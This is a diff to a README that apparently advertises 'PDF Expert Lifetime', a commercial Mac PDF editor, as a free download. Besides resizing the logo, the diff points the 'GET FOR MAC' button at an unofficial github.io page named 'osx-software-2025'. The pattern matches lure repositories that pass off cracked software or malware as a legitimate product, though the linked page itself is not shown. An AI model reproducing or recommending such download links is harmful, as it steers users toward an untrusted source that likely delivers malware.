@@ -1,12 +1,12 @@
 # PDF Expert Lifetime – Fast and Intuitive PDF Editor
 
 <div align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/PDF_Expert_Logo.svg/2044px-PDF_Expert_Logo.svg.png" width="250"/>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/PDF_Expert_Logo.svg/2044px-PDF_Expert_Logo.svg.png" width="200"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](#)
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-software-2025.github.io/.github/editor)
 
 </div>
 
